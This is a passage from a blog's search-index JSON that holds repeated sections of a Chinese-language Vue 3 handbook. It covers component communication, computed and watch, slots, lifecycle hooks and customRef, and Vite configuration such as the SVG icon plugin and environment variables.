复杂的对象 provide('money',{qian,func}) // 子 let q = inject('money',5) // 默认值5,顺便用来做类型推断 // 复杂的对象 let {qian,func} = inject('money',{q:5,f:()=\u003e{}}) ","date":"2024-03-09","objectID":"/posts/%E7%AC%94%E8%AE%B0/vue%E6%89%8B%E5%86%8C/:2:4","series":null,"tags":["blog","vue","前端"],"title":"Vue手册","uri":"/posts/%E7%AC%94%E8%AE%B0/vue%E6%89%8B%E5%86%8C/#信息传递"},{"categories":["blog"],"content":" 信息传递 defineProps/父与子 父传子 使用props. 子传父 1: 父传子一个函数,子接收并带上参数来调用函数 // 父 \u003c子组件 :dataA=\"dataA\" @click=\"fangfa\"\u003e function fangfa(value:number){ consolo.log(value) } // 子 // 接收特定key,例如字符串 \u003c子组件 a=\"a\" b=\"b\"\u003e defineProps(['dataA','fangfa']) fangfa(1) // 接收父组件的Person对象 defineProps\u003c{dataA:Person}\u003e() // 可以不传 defineProps\u003c{dataA?:Person}\u003e() // 默认值 withDefaults(defineProps\u003c{dataA?:Person}\u003e(),{ dataA: ()=\u003e [{id: 1,name: \"ken\",age: 1}] }) emit 自定义事件/子传父只能子传父 2: 自定义一个函数名 haha, 传入一个函数 子组件接收特定名称, 然后 emit 传回去 // 父 \u003c子组件 @haha=\"fangfa\"\u003e function fangfa(value:number){ consolo.log(value) } // 子 var a = ref(1) const emit = defineEmits(['haha']) mitt 事件订阅传递/任意组件 import mitt from 'mitt' const emitter = mitt() // 监听 emitter.on('foo', e =\u003e console.log('foo', e) ) // 触发 emitter.emit('foo', { a: 'b' }) // 去掉所有事件 emitter.all.clear() unMounted(()=\u003e{ // 销毁的时候去掉这个 emitter.off('foo') }) v-model 底层原理/父与子关于 $event 如果是原始 html 对象, 例如 input . 那么 $event 就是 dom 元素, 需要去 target.value 获取值 如果是自己定义的事情或对象, 那么 $event 就是你传递的对象 // 父 // 其实是下面的简写 let username = ref('ken') // 子 // 接收传入的值 defineProps(['modelValue']) // 接受传递的事件 const emit = defineEmits(['update:modelValue']) $attr 父传子父传子的时候, 如果子没有使用 defineProps 接收. 就会到子组件的 $attr 里. 常见于把用户的配置通过 attrs 传递到下层组件. 所以常见场景是: 二次封装组件 // 父 // {c:1,d:2} 等于 :c=\"1\" :d=\"2\" // 子 原封不动传递一下 ","date":"2024-03-09","objectID":"/posts/%E7%AC%94%E8%AE%B0/vue%E6%89%8B%E5%86%8C/:2:4","series":null,"tags":["blog","vue","前端"],"title":"Vue手册","uri":"/posts/%E7%AC%94%E8%AE%B0/vue%E6%89%8B%E5%86%8C/#defineprops父与子"},{"categories":["blog"],"content":" 信息传递 defineProps/父与子 父传子 使用props. 子传父 1: 父传子一个函数,子接收并带上参数来调用函数 // 父 \u003c子组件 :dataA=\"dataA\" @click=\"fangfa\"\u003e function fangfa(value:number){ consolo.log(value) } // 子 // 接收特定key,例如字符串 \u003c子组件 a=\"a\" b=\"b\"\u003e defineProps(['dataA','fangfa']) fangfa(1) // 接收父组件的Person对象 defineProps\u003c{dataA:Person}\u003e() // 可以不传 defineProps\u003c{dataA?:Person}\u003e() // 默认值 withDefaults(defineProps\u003c{dataA?:Person}\u003e(),{ dataA: ()=\u003e [{id: 1,name: \"ken\",age: 1}] }) emit 自定义事件/子传父只能子传父 2: 自定义一个函数名 haha, 传入一个函数 子组件接收特定名称, 然后 emit 传回去 // 父 \u003c子组件 @haha=\"fangfa\"\u003e function fangfa(value:number){ consolo.log(value) } // 子 var a = ref(1) const emit = defineEmits(['haha']) mitt 事件订阅传递/任意组件 import mitt from 'mitt' const emitter = mitt() // 监听 emitter.on('foo', e =\u003e console.log('foo', e) ) // 触发 emitter.emit('foo', { a: 'b' }) // 去掉所有事件 emitter.all.clear() unMounted(()=\u003e{ // 销毁的时候去掉这个 emitter.off('foo') }) v-model 底层原理/父与子关于 $event 如果是原始 html 对象, 例如 input . 那么 $event 就是 dom 元素, 需要去 target.value 获取值 如果是自己定义的事情或对象, 那么 $event 就是你传递的对象 // 父 // 其实是下面的简写 let username = ref('ken') // 子 // 接收传入的值 defineProps(['modelValue']) // 接受传递的事件 const emit = defineEmits(['update:modelValue']) $attr 父传子父传子的时候, 如果子没有使用 defineProps 接收. 就会到子组件的 $attr 里. 常见于把用户的配置通过 attrs 传递到下层组件. 所以常见场景是: 二次封装组件 // 父 // {c:1,d:2} 等于 :c=\"1\" :d=\"2\" // 子 原封不动传递一下 ","date":"2024-03-09","objectID":"/posts/%E7%AC%94%E8%AE%B0/vue%E6%89%8B%E5%86%8C/:2:4","series":null,"tags":["blog","vue","前端"],"title":"Vue手册","uri":"/posts/%E7%AC%94%E8%AE%B0/vue%E6%89%8B%E5%86%8C/#emit-自定义事件子传父"},{"categories":["blog"],"content":" 信息传递 defineProps/父与子 父传子 使用props. 子传父 1: 父传子一个函数,子接收并带上参数来调用函数 // 父 \u003c子组件 :dataA=\"dataA\" @click=\"fangfa\"\u003e function fangfa(value:number){ consolo.log(value) } // 子 // 接收特定key,例如字符串 \u003c子组件 a=\"a\" b=\"b\"\u003e defineProps(['dataA','fangfa']) fangfa(1) // 接收父组件的Person对象 defineProps\u003c{dataA:Person}\u003e() // 可以不传 defineProps\u003c{dataA?:Person}\u003e() // 默认值 withDefaults(defineProps\u003c{dataA?:Person}\u003e(),{ dataA: ()=\u003e [{id: 1,name: \"ken\",age: 1}] }) emit 自定义事件/子传父只能子传父 2: 自定义一个函数名 haha, 传入一个函数 子组件接收特定名称, 然后 emit 传回去 // 父 \u003c子组件 @haha=\"fangfa\"\u003e function fangfa(value:number){ consolo.log(value) } // 子 var a = ref(1) const emit = defineEmits(['haha']) mitt 事件订阅传递/任意组件 import mitt from 'mitt' const emitter = mitt() // 监听 emitter.on('foo', e =\u003e console.log('foo', e) ) // 触发 emitter.emit('foo', { a: 'b' }) // 去掉所有事件 emitter.all.clear() unMounted(()=\u003e{ // 销毁的时候去掉这个 emitter.off('foo') }) v-model 底层原理/父与子关于 $event 如果是原始 html 对象, 例如 input . 那么 $event 就是 dom 元素, 需要去 target.value 获取值 如果是自己定义的事情或对象, 那么 $event 就是你传递的对象 // 父 // 其实是下面的简写 let username = ref('ken') // 子 // 接收传入的值 defineProps(['modelValue']) // 接受传递的事件 const emit = defineEmits(['update:modelValue']) $attr 父传子父传子的时候, 如果子没有使用 defineProps 接收. 就会到子组件的 $attr 里. 常见于把用户的配置通过 attrs 传递到下层组件. 所以常见场景是: 二次封装组件 // 父 // {c:1,d:2} 等于 :c=\"1\" :d=\"2\" // 子 原封不动传递一下 ","date":"2024-03-09","objectID":"/posts/%E7%AC%94%E8%AE%B0/vue%E6%89%8B%E5%86%8C/:2:4","series":null,"tags":["blog","vue","前端"],"title":"Vue手册","uri":"/posts/%E7%AC%94%E8%AE%B0/vue%E6%89%8B%E5%86%8C/#mitt-事件订阅传递任意组件"},{"categories":["blog"],"content":" 信息传递 defineProps/父与子 父传子 使用props. 子传父 1: 父传子一个函数,子接收并带上参数来调用函数 // 父 \u003c子组件 :dataA=\"dataA\" @click=\"fangfa\"\u003e function fangfa(value:number){ consolo.log(value) } // 子 // 接收特定key,例如字符串 \u003c子组件 a=\"a\" b=\"b\"\u003e defineProps(['dataA','fangfa']) fangfa(1) // 接收父组件的Person对象 defineProps\u003c{dataA:Person}\u003e() // 可以不传 defineProps\u003c{dataA?:Person}\u003e() // 默认值 withDefaults(defineProps\u003c{dataA?:Person}\u003e(),{ dataA: ()=\u003e [{id: 1,name: \"ken\",age: 1}] }) emit 自定义事件/子传父只能子传父 2: 自定义一个函数名 haha, 传入一个函数 子组件接收特定名称, 然后 emit 传回去 // 父 \u003c子组件 @haha=\"fangfa\"\u003e function fangfa(value:number){ consolo.log(value) } // 子 var a = ref(1) const emit = defineEmits(['haha']) mitt 事件订阅传递/任意组件 import mitt from 'mitt' const emitter = mitt() // 监听 emitter.on('foo', e =\u003e console.log('foo', e) ) // 触发 emitter.emit('foo', { a: 'b' }) // 去掉所有事件 emitter.all.clear() unMounted(()=\u003e{ // 销毁的时候去掉这个 emitter.off('foo') }) v-model 底层原理/父与子关于 $event 如果是原始 html 对象, 例如 input . 那么 $event 就是 dom 元素, 需要去 target.value 获取值 如果是自己定义的事情或对象, 那么 $event 就是你传递的对象 // 父 // 其实是下面的简写 let username = ref('ken') // 子 // 接收传入的值 defineProps(['modelValue']) // 接受传递的事件 const emit = defineEmits(['update:modelValue']) $attr 父传子父传子的时候, 如果子没有使用 defineProps 接收. 就会到子组件的 $attr 里. 常见于把用户的配置通过 attrs 传递到下层组件. 所以常见场景是: 二次封装组件 // 父 // {c:1,d:2} 等于 :c=\"1\" :d=\"2\" // 子 原封不动传递一下 ","date":"2024-03-09","objectID":"/posts/%E7%AC%94%E8%AE%B0/vue%E6%89%8B%E5%86%8C/:2:4","series":null,"tags":["blog","vue","前端"],"title":"Vue手册","uri":"/posts/%E7%AC%94%E8%AE%B0/vue%E6%89%8B%E5%86%8C/#v-model-底层原理父与子"},{"categories":["blog"],"content":" 信息传递 defineProps/父与子 父传子 使用props. 子传父 1: 父传子一个函数,子接收并带上参数来调用函数 // 父 \u003c子组件 :dataA=\"dataA\" @click=\"fangfa\"\u003e function fangfa(value:number){ consolo.log(value) } // 子 // 接收特定key,例如字符串 \u003c子组件 a=\"a\" b=\"b\"\u003e defineProps(['dataA','fangfa']) fangfa(1) // 接收父组件的Person对象 defineProps\u003c{dataA:Person}\u003e() // 可以不传 defineProps\u003c{dataA?:Person}\u003e() // 默认值 withDefaults(defineProps\u003c{dataA?:Person}\u003e(),{ dataA: ()=\u003e [{id: 1,name: \"ken\",age: 1}] }) emit 自定义事件/子传父只能子传父 2: 自定义一个函数名 haha, 传入一个函数 子组件接收特定名称, 然后 emit 传回去 // 父 \u003c子组件 @haha=\"fangfa\"\u003e function fangfa(value:number){ consolo.log(value) } // 子 var a = ref(1) const emit = defineEmits(['haha']) mitt 事件订阅传递/任意组件 import mitt from 'mitt' const emitter = mitt() // 监听 emitter.on('foo', e =\u003e console.log('foo', e) ) // 触发 emitter.emit('foo', { a: 'b' }) // 去掉所有事件 emitter.all.clear() unMounted(()=\u003e{ // 销毁的时候去掉这个 emitter.off('foo') }) v-model 底层原理/父与子关于 $event 如果是原始 html 对象, 例如 input . 那么 $event 就是 dom 元素, 需要去 target.value 获取值 如果是自己定义的事情或对象, 那么 $event 就是你传递的对象 // 父 // 其实是下面的简写 let username = ref('ken') // 子 // 接收传入的值 defineProps(['modelValue']) // 接受传递的事件 const emit = defineEmits(['update:modelValue']) $attr 父传子父传子的时候, 如果子没有使用 defineProps 接收. 就会到子组件的 $attr 里. 常见于把用户的配置通过 attrs 传递到下层组件. 所以常见场景是: 二次封装组件 // 父 // {c:1,d:2} 等于 :c=\"1\" :d=\"2\" // 子 原封不动传递一下 ","date":"2024-03-09","objectID":"/posts/%E7%AC%94%E8%AE%B0/vue%E6%89%8B%E5%86%8C/:2:4","series":null,"tags":["blog","vue","前端"],"title":"Vue手册","uri":"/posts/%E7%AC%94%E8%AE%B0/vue%E6%89%8B%E5%86%8C/#attr-父传子"},{"categories":["blog"],"content":" 信息传递 defineProps/父与子 父传子 使用props. 子传父 1: 父传子一个函数,子接收并带上参数来调用函数 // 父 \u003c子组件 :dataA=\"dataA\" @click=\"fangfa\"\u003e function fangfa(value:number){ consolo.log(value) } // 子 // 接收特定key,例如字符串 \u003c子组件 a=\"a\" b=\"b\"\u003e defineProps(['dataA','fangfa']) fangfa(1) // 接收父组件的Person对象 defineProps\u003c{dataA:Person}\u003e() // 可以不传 defineProps\u003c{dataA?:Person}\u003e() // 默认值 withDefaults(defineProps\u003c{dataA?:Person}\u003e(),{ dataA: ()=\u003e [{id: 1,name: \"ken\",age: 1}] }) emit 自定义事件/子传父只能子传父 2: 自定义一个函数名 haha, 传入一个函数 子组件接收特定名称, 然后 emit 传回去 // 父 \u003c子组件 @haha=\"fangfa\"\u003e function fangfa(value:number){ consolo.log(value) } // 子 var a = ref(1) const emit = defineEmits(['haha']) mitt 事件订阅传递/任意组件 import mitt from 'mitt' const emitter = mitt() // 监听 emitter.on('foo', e =\u003e console.log('foo', e) ) // 触发 emitter.emit('foo', { a: 'b' }) // 去掉所有事件 emitter.all.clear() unMounted(()=\u003e{ // 销毁的时候去掉这个 emitter.off('foo') }) v-model 底层原理/父与子关于 $event 如果是原始 html 对象, 例如 input . 那么 $event 就是 dom 元素, 需要去 target.value 获取值 如果是自己定义的事情或对象, 那么 $event 就是你传递的对象 // 父 // 其实是下面的简写 let username = ref('ken') // 子 // 接收传入的值 defineProps(['modelValue']) // 接受传递的事件 const emit = defineEmits(['update:modelValue']) $attr 父传子父传子的时候, 如果子没有使用 defineProps 接收. 就会到子组件的 $attr 里. 常见于把用户的配置通过 attrs 传递到下层组件. 所以常见场景是: 二次封装组件 // 父 // {c:1,d:2} 等于 :c=\"1\" :d=\"2\" // 子 原封不动传递一下 ","date":"2024-03-09","objectID":"/posts/%E7%AC%94%E8%AE%B0/vue%E6%89%8B%E5%86%8C/:2:4","series":null,"tags":["blog","vue","前端"],"title":"Vue手册","uri":"/posts/%E7%AC%94%E8%AE%B0/vue%E6%89%8B%E5%86%8C/#refs-父传子--parent-子传父"},{"categories":["blog"],"content":" 信息传递 defineProps/父与子 父传子 使用props. 子传父 1: 父传子一个函数,子接收并带上参数来调用函数 // 父 \u003c子组件 :dataA=\"dataA\" @click=\"fangfa\"\u003e function fangfa(value:number){ consolo.log(value) } // 子 // 接收特定key,例如字符串 \u003c子组件 a=\"a\" b=\"b\"\u003e defineProps(['dataA','fangfa']) fangfa(1) // 接收父组件的Person对象 defineProps\u003c{dataA:Person}\u003e() // 可以不传 defineProps\u003c{dataA?:Person}\u003e() // 默认值 withDefaults(defineProps\u003c{dataA?:Person}\u003e(),{ dataA: ()=\u003e [{id: 1,name: \"ken\",age: 1}] }) emit 自定义事件/子传父只能子传父 2: 自定义一个函数名 haha, 传入一个函数 子组件接收特定名称, 然后 emit 传回去 // 父 \u003c子组件 @haha=\"fangfa\"\u003e function fangfa(value:number){ consolo.log(value) } // 子 var a = ref(1) const emit = defineEmits(['haha']) mitt 事件订阅传递/任意组件 import mitt from 'mitt' const emitter = mitt() // 监听 emitter.on('foo', e =\u003e console.log('foo', e) ) // 触发 emitter.emit('foo', { a: 'b' }) // 去掉所有事件 emitter.all.clear() unMounted(()=\u003e{ // 销毁的时候去掉这个 emitter.off('foo') }) v-model 底层原理/父与子关于 $event 如果是原始 html 对象, 例如 input . 那么 $event 就是 dom 元素, 需要去 target.value 获取值 如果是自己定义的事情或对象, 那么 $event 就是你传递的对象 // 父 // 其实是下面的简写 let username = ref('ken') // 子 // 接收传入的值 defineProps(['modelValue']) // 接受传递的事件 const emit = defineEmits(['update:modelValue']) $attr 父传子父传子的时候, 如果子没有使用 defineProps 接收. 就会到子组件的 $attr 里. 常见于把用户的配置通过 attrs 传递到下层组件. 所以常见场景是: 二次封装组件 // 父 // {c:1,d:2} 等于 :c=\"1\" :d=\"2\" // 子 原封不动传递一下 ","date":"2024-03-09","objectID":"/posts/%E7%AC%94%E8%AE%B0/vue%E6%89%8B%E5%86%8C/:2:4","series":null,"tags":["blog","vue","前端"],"title":"Vue手册","uri":"/posts/%E7%AC%94%E8%AE%B0/vue%E6%89%8B%E5%86%8C/#provideinject-祖传"},{"categories":["blog"],"content":" for 循环 循环遍历数组 (person, index) in Persons 循环遍历对象 v-for=\"(value, key, index) in object\" ","date":"2024-03-09","objectID":"/posts/%E7%AC%94%E8%AE%B0/vue%E6%89%8B%E5%86%8C/:2:5","series":null,"tags":["blog","vue","前端"],"title":"Vue手册","uri":"/posts/%E7%AC%94%E8%AE%B0/vue%E6%89%8B%E5%86%8C/#for-循环"},{"categories":["blog"],"content":" computed 计算computed 肯定有返回值 依赖项不变, 就可以用缓存. 性能好 不能异步. 场景: 购物车结算, 字符串拼接 let price = ref(0)//$0 let p = computed\u003cstring\u003e(()=\u003e{ return `$` + price.value }) ","date":"2024-03-09","objectID":"/posts/%E7%AC%94%E8%AE%B0/vue%E6%89%8B%E5%86%8C/:2:6","series":null,"tags":["blog","vue","前端"],"title":"Vue手册","uri":"/posts/%E7%AC%94%E8%AE%B0/vue%E6%89%8B%E5%86%8C/#computed-计算"},{"categories":["blog"],"content":" watch 变化watch 返回值是停止自己 每次都重新执行整体 可以异步 场景: 搜索框匹配内容, 做一些计算内容的限制 const stopWatch = watch(sum, (newValue, oldValue) =\u003e { console.log('sum变化了', newValue, oldValue) if (newValue \u003e= 10) { // 停止 stopWatch() } }, { immediate: false, deep: false }) ","date":"2024-03-09","objectID":"/posts/%E7%AC%94%E8%AE%B0/vue%E6%89%8B%E5%86%8C/:2:7","series":null,"tags":["blog","vue","前端"],"title":"Vue手册","uri":"/posts/%E7%AC%94%E8%AE%B0/vue%E6%89%8B%E5%86%8C/#watch-变化"},{"categories":["blog"],"content":" slot 插槽假设一个页面, 有一个热门推荐窗口. 推荐图片 推荐视频 推荐文字 那么用 slot 就可以传递不同的元素. // 父 \u003ch3\u003e今日推荐\u003c/h3\u003e \u003cchild\u003e \u003cimg src=\"xxx\"\u003e \u003c/child\u003e // 子 \u003ctemplate\u003e \u003cslot\u003e默认没有内容\u003c/slot\u003e \u003c/template\u003e 具名插槽 给插槽一个名字, 对应插入内容. \u003c!-- ParentComponent.vue --\u003e \u003ctemplate\u003e \u003cChildComponent\u003e \u003ctemplate v-slot:header\u003e \u003ch2\u003e这是标题\u003c/h2\u003e \u003c/template\u003e \u003ctemplate v-slot:footer\u003e \u003cp\u003e这是页脚\u003c/p\u003e \u003c/template\u003e \u003c/ChildComponent\u003e \u003c/template\u003e \u003c!-- ChildComponent.vue --\u003e \u003ctemplate\u003e \u003cdiv\u003e \u003cheader\u003e \u003cslot name=\"header\"\u003e\u003c/slot\u003e \u003c/header\u003e \u003cmain\u003e \u003cslot\u003e\u003c/slot\u003e \u003c/main\u003e \u003cfooter\u003e \u003cslot name=\"footer\"\u003e\u003c/slot\u003e \u003c/footer\u003e \u003c/div\u003e \u003c/template\u003e 作用域插槽: 子组件有数据 q={a:1}. 而父组件需要定义如何展示. 就会用到 q.a. 就需要作用域插槽解决这个问题. 常见于 ui 组件库. 你在编写一个 ui 组件库的 table 组件, 有一个配套的搜索栏. 这时候父组件就需要传入搜索的字段, 配置这个搜索框的样式. 而可以使用哪些字段来搜索, 是 table 组件控制的. 所以 table 子组件把可以用的字段通过 slot 传递给父组件. ","date":"2024-03-09","objectID":"/posts/%E7%AC%94%E8%AE%B0/vue%E6%89%8B%E5%86%8C/:2:8","series":null,"tags":["blog","vue","前端"],"title":"Vue手册","uri":"/posts/%E7%AC%94%E8%AE%B0/vue%E6%89%8B%E5%86%8C/#slot-插槽"},{"categories":["blog"],"content":" lifetime 生命周期 setup 创建阶段 onBeforeMounted, onMounted 挂载阶段 onBeforeUpdated, onUpdated 更新阶段 onBeforeUpdated, onUnmounted 卸载阶段 onMounted(()=\u003e{ console.log(1) }) ","date":"2024-03-09","objectID":"/posts/%E7%AC%94%E8%AE%B0/vue%E6%89%8B%E5%86%8C/:2:9","series":null,"tags":["blog","vue","前端"],"title":"Vue手册","uri":"/posts/%E7%AC%94%E8%AE%B0/vue%E6%89%8B%E5%86%8C/#lifetime-生命周期"},{"categories":["blog"],"content":" 其他 shallowref({a:1,b:{c:2}}): 包裹对象的第一层 a 响应式. 下级 b 不监测. 性能更好 readonly({a:1,b:2}) 无法修改 const rawObj = toRaw(reactiveObj) 拿到 reactive 包装前的原对象. const nonReactiveObj = markRaw(copiedObj) 相当于深拷贝一个新对象出来. teleport 让一个组件渲染到不同的 dom 位置 (例如相对于 body 元素, 而不是当前位置) suspense 自定义一个 loading 或加载失败时展示内容. 是占位符 + 加载状态展示 customRef 是 Vue 3 中的一个函数，用于创建一个自定义的 ref 对象。通过 customRef，你可以定义一个自定义的 getter 和 setter 函数来管理 ref 对象的值，并且可以手动控制依赖追踪和触发更新。这使得你可以更灵活地处理一些复杂的情况，例如惰性计算、异步更新等。 import { customRef } from 'vue'; function customComputedRef(getter, setter) { let value = getter(); return customRef((track, trigger) =\u003e { return { get() { track(); // 手动追踪依赖 return value; }, set(newValue) { setter(newValue); value = newValue; trigger(); // 手动触发更新 } }; }); } const myCustomRef = customComputedRef( () =\u003e { console.log('getter executed'); return 1; }, (v) =\u003e { console.log('setter executed', v); } ); console.log(myCustomRef.value); // 输出: \"getter executed\", 1 myCustomRef.value = 2; // 输出: \"setter executed\", 2 console.log(myCustomRef.value); // 输出: \"getter executed\", 2 ","date":"2024-03-09","objectID":"/posts/%E7%AC%94%E8%AE%B0/vue%E6%89%8B%E5%86%8C/:2:10","series":null,"tags":["blog","vue","前端"],"title":"Vue手册","uri":"/posts/%E7%AC%94%E8%AE%B0/vue%E6%89%8B%E5%86%8C/#其他"},{"categories":["blog"],"content":" 工具","date":"2024-03-09","objectID":"/posts/%E7%AC%94%E8%AE%B0/vue%E6%89%8B%E5%86%8C/:3:0","series":null,"tags":["blog","vue","前端"],"title":"Vue手册","uri":"/posts/%E7%AC%94%E8%AE%B0/vue%E6%89%8B%E5%86%8C/#工具"},{"categories":["blog"],"content":" vite 相关资源 vite文档地址 GitHub - vbenjs/vite-plugin-svg-icons: Vite Plugin for fast creating SVG sprites. iconfonticonfont 是阿里的图标库. 这里介绍用法. 安装插件 pnpm install vite-plugin-svg-icons -D 配置 vite.config.ts import { createSvgIconsPlugin } from 'vite-plugin-svg-icons' import path from 'path' export default defineConfig({ plugins: [ // 关键内容 createSvgIconsPlugin({ iconDirs: [path.resolve(process.cwd(), 'src/assets/icons')], symbolId: 'icon-[dir]-[name]' }) ], }) 配置 main.ts // svg插件 import 'virtual:svg-icons-register' 创建文件夹 src/assets/icons, 去 iconfont 下载 svg 到这个文件夹. 例如 src/assets/icons/dollor.svg 使用方法: fill 控制颜色 样式控制大小 \u003csvg class=\"svg\"\u003e \u003cuse xlink:href=\"#icon-dollor\" fill=\"red\"\u003e\u003c/use\u003e \u003c/svg\u003e \u003cstyle scoped\u003e .svg { width: 2rem; } \u003c/style\u003e 封装一下 src/components/SvgIcon/index.vue 组件 \u003ctemplate\u003e \u003csvg :style=\"{ width: size, height: size }\"\u003e \u003cuse :xlink:href=\"prefix + name\" :fill=\"fill\"\u003e\u003c/use\u003e \u003c/svg\u003e \u003c/template\u003e \u003cscript lang=\"ts\" setup\u003e defineOptions({ name: \"svg-component\" }) const prefix = \"#icon-\" withDefaults(defineProps\u003c{ name?: string, size?: string, fill?: string }\u003e(), { // 默认图标 name: () =\u003e \"info-circle\", // 大小 size: () =\u003e \"1rem\", // 填充颜色 fill: () =\u003e \"\" }) \u003c/script\u003e 使用组件 \u003csvg-icon name=\"dollor\" size=\"2rem\" fill=\"red\"\u003e\u003c/svg-icon\u003e import SvgIcon from \"@/components/SvgIcon/index.vue\"; env 环境变量vite 使用 .env 文件区分使用环境变量, 暴露在 import.meta.env 对象里. 已有的变量: import.meta.env.MODE: {string} 应用运行的 模式。 import.meta.env.BASE_URL: {string} 部署应用时候的基础 url, 默认 / import.meta.env.PROD: {boolean} 是否生产环境. NODE_ENV='production' 决定这个值 import.meta.env.DEV: {boolean} 是不是开发环境 import.meta.env.SSR: {boolean} 应用是否运行在 SSR 模式 使用场景 # \"dev\":\"vite\" 所以等同于直接执行 vite 命令 # 读取 .env.development pnpm dev # 等于并行运行 vue-tsc --build --force \u0026\u0026 vite build # 读取 .env.prodution pnpm build # 使用 --mode 指定读取的文件 .env.staging vite build --mode staging process.env.NODE_ENV 和 vite build --mode env 不是一个东西. 但是建议在 .env 文件里加入加上这个变量. 使得统一 # 示例如下 # .env VITE_APP_TITLE = '我是名字' # .env.development NODE_ENV = 'development' VITE_KEN = 'development' VITE_SERVER_URL = 'http://127.0.0.1:5000/' # .env.production NODE_ENV = 'production' VITE_KEN = 'production' VITE_SERVER_URL = 'http://127.0.0.1:5000/' 自定义组件名现在 可以这样指定名字 defineOptions({ name: 'Foo', // ... 更多自定义属性 }) 以前写 vue 的时候组件名会是文件名. 无法配置组件名称, 可以使用 vite-plugin-vue-setup-extend. import vueSetupExtend from 'vite-plugin-vue-setup-extend' export default defineConfig({ plugins: [ vue(), vueSetupExtend() // 加入 ], resolve: { alias: { '@': fileURLToPath(new URL('./src', import.meta.url)) } } }) 于是我们就可以像 xml 一样写 name 的值 \u003cscript setup lang=\"ts\" name=\"自定义组件明\"\u003e defineProps\u003c{ msg: string }\u003e() \u003c/script\u003e ","date":"2024-03-09","objectID":"/posts/%E7%AC%94%E8%AE%B0/vue%E6%89%8B%E5%86%8C/:3:1","series":null,"tags":["blog","vue","前端"],"title":"Vue手册","uri":"/posts/%E7%AC%94%E8%AE%B0/vue%E6%89%8B%E5%86%8C/#vite"},{"categories":["blog"],"content":" vite 相关资源 vite文档地址 GitHub - vbenjs/vite-plugin-svg-icons: Vite Plugin for fast creating SVG sprites. iconfonticonfont 是阿里的图标库. 这里介绍用法. 安装插件 pnpm install vite-plugin-svg-icons -D 配置 vite.config.ts import { createSvgIconsPlugin } from 'vite-plugin-svg-icons' import path from 'path' export default defineConfig({ plugins: [ // 关键内容 createSvgIconsPlugin({ iconDirs: [path.resolve(process.cwd(), 'src/assets/icons')], symbolId: 'icon-[dir]-[name]' }) ], }) 配置 main.ts // svg插件 import 'virtual:svg-icons-register' 创建文件夹 src/assets/icons, 去 iconfont 下载 svg 到这个文件夹. 例如 src/assets/icons/dollor.svg 使用方法: fill 控制颜色 样式控制大小 封装一下 src/components/SvgIcon/index.vue 组件 使用组件 import SvgIcon from \"@/components/SvgIcon/index.vue\"; env 环境变量vite 使用 .env 文件区分使用环境变量, 暴露在 import.meta.env 对象里. 已有的变量: import.meta.env.MODE: {string} 应用运行的 模式。 import.meta.env.BASE_URL: {string} 部署应用时候的基础 url, 默认 / import.meta.env.PROD: {boolean} 是否生产环境. NODE_ENV='production' 决定这个值 import.meta.env.DEV: {boolean} 是不是开发环境 import.meta.env.SSR: {boolean} 应用是否运行在 SSR 模式 使用场景 # \"dev\":\"vite\" 所以等同于直接执行 vite 命令 # 读取 .env.development pnpm dev # 等于并行运行 vue-tsc --build --force \u0026\u0026 vite build # 读取 .env.prodution pnpm build # 使用 --mode 指定读取的文件 .env.staging vite build --mode staging process.env.NODE_ENV 和 vite build --mode env 不是一个东西. 但是建议在 .env 文件里加入加上这个变量. 使得统一 # 示例如下 # .env VITE_APP_TITLE = '我是名字' # .env.development NODE_ENV = 'development' VITE_KEN = 'development' VITE_SERVER_URL = 'http://127.0.0.1:5000/' # .env.production NODE_ENV = 'production' VITE_KEN = 'production' VITE_SERVER_URL = 'http://127.0.0.1:5000/' 自定义组件名现在 可以这样指定名字 defineOptions({ name: 'Foo', // ... 更多自定义属性 }) 以前写 vue 的时候组件名会是文件名. 无法配置组件名称, 可以使用 vite-plugin-vue-setup-extend. import vueSetupExtend from 'vite-plugin-vue-setup-extend' export default defineConfig({ plugins: [ vue(), vueSetupExtend() // 加入 ], resolve: { alias: { '@': fileURLToPath(new URL('./src', import.meta.url)) } } }) 于是我们就可以像 xml 一样写 name 的值 ","date":"2024-03-09","objectID":"/posts/%E7%AC%94%E8%AE%B0/vue%E6%89%8B%E5%86%8C/:3:1","series":null,"tags":["blog","vue","前端"],"title":"Vue手册","uri":"/posts/%E7%AC%94%E8%AE%B0/vue%E6%89%8B%E5%86%8C/#相关资源"},{"categories":["blog"],"content":" vite 相关资源 vite文档地址 GitHub - vbenjs/vite-plugin-svg-icons: Vite Plugin for fast creating SVG sprites. iconfonticonfont 是阿里的图标库. 这里介绍用法. 安装插件 pnpm install vite-plugin-svg-icons -D 配置 vite.config.ts import { createSvgIconsPlugin } from 'vite-plugin-svg-icons' import path from 'path' export default defineConfig({ plugins: [ // 关键内容 createSvgIconsPlugin({ iconDirs: [path.resolve(process.cwd(), 'src/assets/icons')], symbolId: 'icon-[dir]-[name]' }) ], }) 配置 main.ts // svg插件 import 'virtual:svg-icons-register' 创建文件夹 src/assets/icons, 去 iconfont 下载 svg 到这个文件夹. 例如 src/assets/icons/dollor.svg 使用方法: fill 控制颜色 样式控制大小 封装一下 src/components/SvgIcon/index.vue 组件 使用组件 import SvgIcon from \"@/components/SvgIcon/index.vue\"; env 环境变量vite 使用 .env 文件区分使用环境变量, 暴露在 import.meta.env 对象里. 已有的变量: import.meta.env.MODE: {string} 应用运行的 模式。 import.meta.env.BASE_URL: {string} 部署应用时候的基础 url, 默认 / import.meta.env.PROD: {boolean} 是否生产环境. NODE_ENV='production' 决定这个值 import.meta.env.DEV: {boolean} 是不是开发环境 import.meta.env.SSR: {boolean} 应用是否运行在 SSR 模式 使用场景 # \"dev\":\"vite\" 所以等同于直接执行 vite 命令 # 读取 .env.development pnpm dev # 等于并行运行 vue-tsc --build --force \u0026\u0026 vite build # 读取 .env.prodution pnpm build # 使用 --mode 指定读取的文件 .env.staging vite build --mode staging process.env.NODE_ENV 和 vite build --mode env 不是一个东西. 但是建议在 .env 文件里加入加上这个变量. 使得统一 # 示例如下 # .env VITE_APP_TITLE = '我是名字' # .env.development NODE_ENV = 'development' VITE_KEN = 'development' VITE_SERVER_URL = 'http://127.0.0.1:5000/' # .env.production NODE_ENV = 'production' VITE_KEN = 'production' VITE_SERVER_URL = 'http://127.0.0.1:5000/' 自定义组件名现在 可以这样指定名字 defineOptions({ name: 'Foo', // ... 更多自定义属性 }) 以前写 vue 的时候组件名会是文件名. 无法配置组件名称, 可以使用 vite-plugin-vue-setup-extend. import vueSetupExtend from 'vite-plugin-vue-setup-extend' export default defineConfig({ plugins: [ vue(), vueSetupExtend() // 加入 ], resolve: { alias: { '@': fileURLToPath(new URL('./src', import.meta.url)) } } }) 于是我们就可以像 xml 一样写 